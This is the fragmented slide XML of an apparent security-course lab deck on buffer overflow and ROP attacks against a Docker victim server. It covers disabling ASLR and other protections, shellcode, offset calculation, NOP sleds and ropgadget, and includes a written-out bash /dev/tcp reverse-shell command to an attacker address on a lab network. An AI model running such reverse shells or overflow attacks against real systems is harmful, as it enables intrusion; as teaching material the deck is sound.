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58" r:id="rId5"/>
    <p:sldId id="267" r:id="rId6"/>
    <p:sldId id="260" r:id="rId7"/>
    <p:sldId id="269" r:id="rId8"/>
    <p:sldId id="259" r:id="rId9"/>
    <p:sldId id="261" r:id="rId10"/>
    <p:sldId id="272" r:id="rId11"/>
    <p:sldId id="273" r:id="rId12"/>
    <p:sldId id="274" r:id="rId13"/>
    <p:sldId id="275" r:id="rId14"/>
    <p:sldId id="270" r:id="rId15"/>
    <p:sldId id="265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5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81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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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F41F-EDFD-409C-A5BB-FE1065A5A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888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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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F41F-EDFD-409C-A5BB-FE1065A5A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92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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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F41F-EDFD-409C-A5BB-FE1065A5A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783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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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F41F-EDFD-409C-A5BB-FE1065A5A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85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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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F41F-EDFD-409C-A5BB-FE1065A5A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892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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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F41F-EDFD-409C-A5BB-FE1065A5A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899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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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F41F-EDFD-409C-A5BB-FE1065A5A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450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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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F41F-EDFD-409C-A5BB-FE1065A5A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686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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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F41F-EDFD-409C-A5BB-FE1065A5A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37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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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F41F-EDFD-409C-A5BB-FE1065A5A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462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F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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2F41F-EDFD-409C-A5BB-FE1065A5A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313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6F2131-CA9E-4EA3-93A6-2F1E57DE1BF2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2F41F-EDFD-409C-A5BB-FE1065A5A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526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Buffer Overflow &amp; ROP Lab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849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Preparation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Ubuntu 20.04 VM image</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Hope you already downloaded VM images.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Three docker instances</a:t>
            </a:r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B54FB48-5579-4711-80D8-5CD6C9890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465" y="4193616"/>
            <a:ext cx="3575564" cy="103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706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315D64-FBB2-4C43-825B-5E5F35944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victim program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17401B5-F4A6-4165-8D90-F026791C92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3881" y="2193524"/>
            <a:ext cx="5014949" cy="3000397"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3378170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 off countermeasures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Randonmization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sbin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sysctl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -w </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>kernel.randomize_va_space</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Kernel will not randomize the start address of stack, text etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>But still some randomness, like environment variable, program name…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Stack Canary</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>fno</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-stack-protector</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Non-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Excutable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-z </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>execstack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673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A08A71-0111-4BDD-A14D-85C89F184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exec </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>syscall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D21192-BBD9-45C4-8BD4-107A8641C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Tip: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> convention:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>EAX: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> Number</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Parameters: EBX,ECX,EDX….</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>Return Value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EAX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:effectLst/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:effectLst/>
              </a:rPr>
              <a:t>execve</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> parameters: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140126D-2E84-4CB7-A97D-A3EE601AF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132" y="4401748"/>
            <a:ext cx="5153063" cy="90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427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1: Get familiar with shell code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shell code call </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>execve</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>syscall</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p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r="10438"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6541525" y="1783079"/>
            <a:ext cx="5151049" cy="329184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650897" y="4470963"/>
            <a:ext cx="4174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579"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="043579"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="043579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687809"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2640526" y="5373199"/>
          <a:ext cx="78019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4571">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2833481077"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1114571">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2289482959"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1114571">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1730982422"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1114571">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1482707939"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1114571">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2156616013"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1114571">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="224527385"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1114571">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="21555619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EBX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EBX+0xa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EBX+0xd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EBX+0x48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EBX+0x4c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EBX+0x50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EBX+0x54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931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/bin/bash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/bin/ls…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AAAA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BBBB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CCCC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DDDD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448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EBX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EBX+0xa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EBX+0xd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2817126"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="图片 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{21263AF8-6F1D-416C-9DB1-99D2059CD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50" y="2327815"/>
            <a:ext cx="5167350" cy="254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387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A08A71-0111-4BDD-A14D-85C89F184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 1: Attack tools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D21192-BBD9-45C4-8BD4-107A8641C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shellcode 32.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Write the given string (shell code) to file (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>badfile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>call_shellcode.c</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Call the shell code with indirect call (function pointer)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>To verify the shell code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EB15BB3-368C-49D9-AC33-DE4B766EB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029" y="4118778"/>
            <a:ext cx="3052785" cy="150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359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2: Network structure illustration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Tools:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: send file to network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Goal:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Let the victim start reverse shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/bin/bash -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> &gt; /dev/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/10.0.2.6/9090 0&lt;&amp;1 2&gt;&amp;1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6782463" y="4566940"/>
            <a:ext cx="2850542" cy="10734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矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4039093" y="4594769"/>
            <a:ext cx="1793020" cy="10416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8340917" y="5079799"/>
            <a:ext cx="1255975" cy="52213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Docker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7237755" y="4837284"/>
            <a:ext cx="1255975" cy="52213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Server.c</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4706179" y="4837284"/>
            <a:ext cx="1120472" cy="52213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Attacker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="直接连接符 10"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="9" idx="3"/>
            <a:endCxn id="8" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5826651" y="5098351"/>
            <a:ext cx="141110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4BE65CF9-43D9-47EC-AF22-332B0266761F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4181223" y="5694239"/>
            <a:ext cx="1508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10.0.2.6:9090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FE5FDB2-1301-4021-B7C9-7EE4C4B5A621}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7314508" y="5694239"/>
            <a:ext cx="1596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10.0.2.5:9090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1362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2: Attack Procedure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Step 1:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Get Address of the stack (buffer, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ebp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By echo hello to the port 9090. They will be shown in the docker console.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The address won’t change.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Step 2:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Calculate the position of return address(offset), without the help of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Put the address of buffer into content[offset : offset+4]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Step 3:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Create </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>badfile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and launch the attack.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500796"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2595097" y="4502828"/>
          <a:ext cx="674840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7474">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2495060626"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="893619">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1476140494"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2427316">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1512252533"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="263732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buffer in </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>bof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ebp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RET address(ebp+4)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233167"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="263732">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" baseline="0" dirty="0"/>
                        <a:t>shell code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shell code entry addr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828182"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="26373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start=0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offset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743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6371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B486E6-0750-4A77-9F11-380FF39C7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 3 Unknown </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ebp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B85C4C-AE92-4DAE-B565-53794D965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Launch the attack without the help of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Put the address of buffer into everywhere after shell code.</a:t>
            </a:r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6084D3A-E91A-48C4-A430-6E07A39436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97130"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2000737" y="3113117"/>
          <a:ext cx="674841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0428">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2495060626"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1310451">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2893054534"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1310451">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1476140494"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1438540">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1512252533"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1438540">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="84496715"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="263732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buffer in </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>bof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ebp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>=?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RET address(ebp+4)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233167"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="263732">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" baseline="0" dirty="0"/>
                        <a:t>shell code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shell code entry </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
                        <a:t>addr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shell code entry </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
                        <a:t>addr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shell code entry addr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shell code entry </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
                        <a:t>addr</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" altLang="zh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828182"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="26373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start=0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743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3643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BAE9D4-BD77-490B-B023-FE8892CFC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 4: Attack 64-bit Program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285594-3FF5-4AD9-AC4B-CE24EF104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Differences:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Different shell code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>64 bit addresses contain 0x00, which terminates the string.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Hint:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>We have another copy of string in the stack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Within the stack frame of the main function.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2512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758F4F-ED18-4955-8B5D-CB5F462E7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Bonus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7B118E-8BB1-449A-84A1-DD0CF5725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Try to redirect puts to system()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Write your own shell code.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C3C3C6-026F-4000-9726-10173CAE9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897" y="2844089"/>
            <a:ext cx="6932815" cy="388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042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E50F68-245D-4D36-B0E0-ABB4243C1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8286E8-AD91-4DA2-A084-B0F954FE8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8752" y="3399905"/>
            <a:ext cx="7002087" cy="26980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4000" dirty="0"/>
              <a:t>Let’s start hacking!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491723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AC5F58-26EA-4C5C-BD4E-921CD37F6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 2: ROP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9EC3C6-B3D3-4BC5-94FC-052DCF36E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use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ropgadget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> to get gadget of the binary.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>put gadget addresses and the data that will be consumed by gadgets on stack.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2184AE0-F0D1-4C55-A910-C64AFB67E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734" y="3075178"/>
            <a:ext cx="5281651" cy="314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771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3: Counteract randomness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Randomization:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Stack address is randomized, so we do not know the address of buffer in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Solution:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1. use the address we see, and hope the stack address will be re-used.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. put a lot of NOP before shell code. (Fengshui)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1B888DA-01C0-47A9-A0E3-36A627BB29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852253"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1239038" y="4284288"/>
          <a:ext cx="9111755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2766">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2495060626"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="648393">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2580548782"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="739832">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1263539246"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="386542">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="795923444"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1300942">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="456386239"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="756459">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3886284386"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="541412">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1512252533"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="755374">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2263389314"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1886987">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1098637610"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="490453">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="51333381"/>
                    </a:ext>
                  </a:extLst>
